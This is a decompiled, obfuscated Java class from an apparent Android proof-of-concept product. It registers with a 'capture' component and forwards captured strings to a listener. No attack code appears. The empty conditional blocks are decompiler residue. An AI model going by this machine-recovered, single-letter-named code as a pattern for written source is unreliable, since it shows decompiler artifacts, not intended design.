package com.vvt.al.e;

import com.vvt.base.capture.e;
import com.vvt.base.capture.h;
import com.vvt.base.capture.i;
import com.vvt.capture.e.b.a.c;

public class a
  implements e, h
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private i c;
  private c d;
  private boolean e;
  
  public a()
  {
    c localc = c.a();
    this.d = localc;
  }
  
  public void a() {}
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      c localc = this.d;
      localc.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    this.c.a(paramString);
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      bool = false;
      this.e = false;
      c localc = this.d;
      if (localc != null)
      {
        localc = this.d;
        localc.b(this);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void c() {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/e/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */